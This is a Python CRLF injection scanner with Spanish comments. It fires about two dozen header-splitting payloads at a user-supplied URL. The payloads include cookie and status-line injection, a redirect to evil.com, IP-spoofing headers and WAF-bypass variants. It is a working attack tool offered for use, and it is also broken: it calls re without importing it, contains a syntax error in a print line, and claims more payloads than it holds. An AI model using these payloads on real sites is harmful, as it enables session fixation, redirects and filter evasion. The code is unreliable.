#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CRLF INJECTION v2.0 - TANQUE EDITION
HTTP Response Splitting · Header injection · 30+ payloads · Bypass
"""

import asyncio
import random
from urllib.parse import urlparse, quote
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url): return None

class CRLFInjection:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Parámetros vulnerables
        self.vulnerable_params = [
            'url', 'redirect', 'next', 'return', 'path', 'file',
            'page', 'view', 'redir', 'location', 'dest', 'out',
            'q', 's', 'search', 'query', 'lang', 'language',
            'locale', 'set-locale', 'set_language',
        ]
        
        # Payloads CRLF
        self.payloads = [
            # Básicos
            ('%0d%0a', 'crlf_basic'),
            ('%0a%0d', 'lfcr_basic'),
            ('%0a', 'lf_basic'),
            ('%0d', 'cr_basic'),
            
            # Con headers
            ('%0d%0aX-Injected: 1', 'header_injection'),
            ('%0d%0aLocation: https://evil.com', 'redirect_injection'),
            ('%0d%0aSet-Cookie: injected=1', 'cookie_injection'),
            ('%0d%0aContent-Length: 0', 'content_length'),
            ('%0d%0aHTTP/1.1 200 OK', 'status_injection'),
            
            # Con doble CRLF
            ('%0d%0a%0d%0a', 'double_crlf'),
            ('%0d%0a%0d%0a<html>injected</html>', 'html_injection'),
            
            # Encodings
            ('%25%30%64%25%30%61', 'double_encoded'),
            ('%250d%250a', 'double_percent'),
            ('\\r\\n', 'escaped'),
            
            # Unicode
            ('%u000d%u000a', 'unicode'),
            ('%E5%98%8D%E5%98%8A', 'utf8_smuggling'),
            
            # Variantes
            ('%0D%0A', 'uppercase'),
            ('%0d%0aX-Forwarded-For: 127.0.0.1', 'xff_injection'),
            ('%0d%0aX-Real-IP: 127.0.0.1', 'realip_injection'),
            
            # Bypass WAF
            ('%0d%0a%20X-Injected:1', 'space_bypass'),
            ('%0d%0a\tX-Injected:1', 'tab_bypass'),
            ('%0d%0a/X-Injected:1', 'slash_bypass'),
            ('%0d%0a;X-Injected:1', 'semicolon_bypass'),
            ('%0d%0a%23X-Injected:1', 'comment_bypass'),
        ]
        
        # Patrones de éxito
        self.success_patterns = [
            (r'X-Injected:\s*1', 'header_injection'),
            (r'Location:\s*https?://evil', 'redirect'),
            (r'Set-Cookie:\s*injected=', 'cookie'),
            (r'<html>.*injected.*</html>', 'html'),
            (r'HTTP/1\.1\s+200\s+OK', 'status'),
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=10, max_retries=2)
        
    def extract_params(self) -> List[str]:
        """Extrae parámetros de la URL"""
        params = []
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
                    
        # Añadir parámetros vulnerables
        params.extend(self.vulnerable_params)
        return list(set(params))
        
    def build_test_url(self, param: str, payload: str) -> str:
        """Construye URL de prueba"""
        if '?' in self.url:
            query_parts = self.url.split('?')[1].split('&')
            new_query = []
            replaced = False
            
            for part in query_parts:
                if part.startswith(f"{param}="):
                    new_query.append(f"{param}={part.split('=')[1]}{payload}")
                    replaced = True
                else:
                    new_query.append(part)
                    
            if not replaced:
                new_query.append(f"{param}=test{payload}")
                
            return f"{self.url.split('?')[0]}?{'&'.join(new_query)}"
        else:
            return f"{self.url}?{param}=test{payload}"
            
    def check_response(self, text: str) -> List[str]:
        """Verifica si hay inyección exitosa"""
        indicators = []
        
        for pattern, name in self.success_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                indicators.append(name)
                
        return indicators
        
    async def test_param(self, param: str, payload: tuple) -> Optional[Dict]:
        """Prueba un parámetro con un payload"""
        payload_str, payload_name = payload
        
        test_url = self.build_test_url(param, payload_str)
        
        try:
            resp = await self.client.get(test_url)
            
            if not resp:
                return None
                
            text = await resp.text()
            headers = resp.headers
            
            # Verificar headers inyectados
            injected_headers = []
            for header, value in headers.items():
                if 'injected' in header.lower() or 'injected' in value.lower():
                    injected_headers.append(f"{header}: {value}")
                    
            # Verificar en respuesta
            indicators = self.check_response(text)
            
            if indicators or injected_headers:
                return {
                    'type': 'CRLF_INJECTION',
                    'param': param,
                    'payload': payload_str,
                    'payload_name': payload_name,
                    'url': test_url,
                    'indicators': indicators,
                    'injected_headers': injected_headers,
                    'severity': 'CRITICO'
                }
                
        except Exception as e:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo de CRLF"""
        print(f"\n🔄 CRLF INJECTION v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            params = self.extract_params()
            print(f"[*] Probando {len(params)} parámetros con {len(self.payloads)} payloads")
            print("-" * 70)
            
            for param in params:
                print(f"\n[*] Probando parámetro: {param}")
                
                for payload in self.payloads:
                    result = await self.test_param(param, payload)
                    
                    if result:
                        self.findings.append(result)
                        print(f"   [[CRITICO]] {result['payload_name']}")
                        if result['indicators']:
                            print(f"        ↳ Indicadores: {', '.join(result['indicators'])}")
                        break
                        
                    await asyncio.sleep(random.uniform(0.2, 0.5))
                    
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS CRLF INJECTION")
            print("="*70")
            
            if self.findings:
                print(f"\n[CRITICO] VULNERABILIDADES: {len(self.findings)}")
                for f in self.findings:
                    print(f"   • {f['param']}: {f['payload_name']}")
                    
                # Guardar resultados
                with open(f"crlf_{self.domain}.txt", 'w') as f:
                    for finding in self.findings:
                        f.write(f"{finding['url']}\n")
                print(f"\n💾 Resultados guardados en crlf_{self.domain}.txt")
            else:
                print("\n[OK] No se detectaron CRLF injections")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    import sys
    if len(sys.argv) < 2:
        print("Uso: python3 crlf_injection.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    scanner = CRLFInjection(url, aggressive)
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
